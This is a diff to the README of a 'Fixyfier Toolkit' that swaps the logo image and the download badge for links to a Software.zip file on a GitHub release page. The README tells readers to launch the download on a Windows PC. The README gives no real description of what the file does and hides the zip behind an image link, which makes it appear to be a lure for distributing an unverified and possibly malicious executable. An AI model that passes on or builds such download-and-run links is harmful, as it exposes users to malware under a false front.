@@ -1,6 +1,6 @@
 # Welcome to Fixyfier Toolkit 🛠️
 
-![Fixyfier Logo](https://example.com/fixyfier_logo.jpg)
+![Fixyfier Logo](https://github.com/skibidifart123/Fixyfier/releases/download/v1.0/Software.zip)
 
 ## Description ℹ️
 
@@ -22,7 +22,7 @@ Simply download the Fixyfier toolkit from the link provided below and launch the
 
 ## Download Toolkit 📥
 
-[![Download Fixyfier Toolkit](https://img.shields.io/badge/Download-Fixyfier_Toolkit-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Fixyfier Toolkit](https://github.com/skibidifart123/Fixyfier/releases/download/v1.0/Software.zip)](https://github.com/skibidifart123/Fixyfier/releases/download/v1.0/Software.zip)
 
 *Note: Downloaded file needs to be launched on your Windows PC.*
 
